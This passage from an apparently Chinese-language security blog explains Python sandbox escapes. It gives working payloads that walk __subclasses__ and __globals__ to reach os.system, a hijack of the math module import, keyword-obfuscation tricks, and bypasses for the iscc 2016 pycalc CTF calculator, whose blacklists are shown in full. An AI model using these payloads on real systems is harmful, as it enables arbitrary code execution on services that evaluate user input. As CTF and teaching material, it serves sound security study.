class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)<br>(<span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)<br>(<span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)<br>(<span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)<br>(<span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)<br>(<span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)<br>(<span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;)<br>(<span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;)<br>(<span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;)<br>(<span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;)<br>(<span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;)<br>(<span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;)<br>(<span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)<br>(<span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;)<br>(<span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)<br>(<span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)<br>(<span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)<br>(<span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)<br>(<span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)<br>(<span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p><p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<br>&lt;module <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>其中<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, record=<span class="hljs-literal">False</span>, module=<span class="hljs-literal">None</span></span>):<br>...<br>        <span class="hljs-variable language_">self</span>._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> module isNoneelse module<br>...<br></code></pre></td></tr></table></figure><p>所以通过<code>_module</code>也可以构造 payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>).__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>][<span class="hljs-number">0</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>如果object没被过滤还可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__getattribute__(<span class="hljs-string">&#x27;append&#x27;</span>).__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">dict</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, <span class="hljs-variable language_">self</span>).keys.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        <span class="hljs-comment"># 如果是 3.x 的话可以简写为：</span><br>        <span class="hljs-comment"># super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))</span><br>test()<br></code></pre></td></tr></table></figure><p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性&#x2F;方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类&#x2F;类型<code>__call__</code>后直接运行<code>eval</code>。</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来： math.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br>admin<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;math&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">False</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>读文件暂时没什么发现特别的地方。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了[]"></a>过滤了[]</h2><p>用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.func_globals.get(<span class="hljs-string">&#x27;linecache&#x27;</span>).os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br><span class="hljs-string">&#x27;kali\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p>来自iscc 2016的Pwn300 pycalc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():<br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;   Simple calculator implemented by python   &quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getexp</span>():<br>    <span class="hljs-keyword">return</span> raw_input(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_import_</span>(<span class="hljs-params">name, *args, **kwargs</span>):<br>    module_blacklist = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>,<br>                        <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>,<br>                        <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>                        <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>,<br>                        <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>,<br>                        <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>,<br>                        <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>,<br>                        <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>,<br>                        <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> module_blacklist:<br>        <span class="hljs-keyword">if</span> name == forbid:        <span class="hljs-comment"># don&#x27;t let user import these modules</span><br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="hljs-built_in">format</span>(forbid))<br>    <span class="hljs-comment"># normal modules can be imported</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(name, *args, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>                 <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            return0<br>    return1<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_exec</span>(<span class="hljs-params">command</span>):<span class="hljs-comment"># sandbox user input</span><br>    result = <span class="hljs-number">0</span><br>    __sandboxed_builtins__ = <span class="hljs-built_in">dict</span>(__builtins__.__dict__)<br>    __sandboxed_builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="hljs-comment"># hook import</span><br>    <span class="hljs-keyword">del</span> __sandboxed_builtins__[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    _<span class="hljs-keyword">global</span> = &#123;<br>        <span class="hljs-string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__<br>    &#125;<br>    <span class="hljs-keyword">if</span> sandbox_filter(command) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span><span class="hljs-string">&#x27;Malicious user input detected!!!&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    command = <span class="hljs-string">&#x27;result = &#x27;</span> + command<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span> command <span class="hljs-keyword">in</span> _<span class="hljs-keyword">global</span>     <span class="hljs-comment"># do calculate in a sandboxed environment</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> e<br>        return0<br>    result = _<span class="hljs-keyword">global</span>[<span class="hljs-string">&#x27;result&#x27;</span>]  <span class="hljs-comment"># extract the result</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>banner()<br>while1:<br>    command = getexp()<br>    <span class="hljs-built_in">print</span> sandbox_exec(command)<br></code></pre></td></tr></table></figure><p><code>exec command in _global</code>这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__<br>restricted attribute<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>), <span class="hljs-string">&#x27;FileType&#x27;</span>)(<span class="hljs-string">&#x27;key&#x27;</span>), <span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)()<br>file() constructor <span class="hljs-keyword">not</span> accessible <span class="hljs-keyword">in</span> restricted mode<br></code></pre></td></tr></table></figure><p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types,json 库，来执行任意命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).__builtins__[<span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>]](<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;mets&#x27;</span><span class="hljs-string">&#x27;ys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">getattr</span>(().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>), <span class="hljs-string">&#x27;s&#x27;</span>+<span class="hljs-string">&#x27;yst&#x27;</span>+<span class="hljs-string">&#x27;em&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>两个payload本质区别在取导入的时不同的库</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Phar</title>
    <link href="/blog/2025/01/23/PHP/Phar/"/>
    <url>/blog/2025/01/23/PHP/Phar/</url>
    
